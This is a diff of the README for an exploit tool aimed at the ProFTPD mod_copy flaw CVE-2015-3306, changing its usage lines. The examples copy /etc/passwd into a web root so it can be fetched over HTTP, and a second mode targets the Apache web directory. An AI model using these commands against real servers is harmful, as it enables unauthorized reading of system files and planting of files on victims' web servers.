@@ -7,13 +7,13 @@ Tool coded by Daniel Aldana for [CVE-2015-3306](http://bugs.proftpd.org/show_bug
 usage: 
 
 ```
-python cpx_proftp.py 1 <IP> <REMOTE_FULLPATH_SRC_FILE> <REMOTE_FULLPATH_DST_FILE>
+python cpx_proftp.py <IP> <REMOTE_FULLPATH_SRC_FILE> <REMOTE_FULLPATH_DST_FILE>
 ```
 
 ex:
 
 ```
-python cpx_proftp.py 1 127.0.0.1 /etc/passwd /var/www/pass.txt
+python cpx_proftp.py 127.0.0.1 /etc/passwd /var/www/pass.txt
 ```
 
 then try:
@@ -28,13 +28,13 @@ http://127.0.0.1/pass.txt
 usage: 
 
 ```
-python cpx_proftp.py 2 <IP> <REMOTE_FULLPATH_APACHE2>
+python cpx_proftp.py <IP> <REMOTE_FULLPATH_APACHE2>
 ```
 
 ex:
 
 ```
-python cpx_proftp.py 2 127.0.0.1 /var/www/html
+python cpx_proftp.py 127.0.0.1 /var/www/html
 ```
 
 then try:
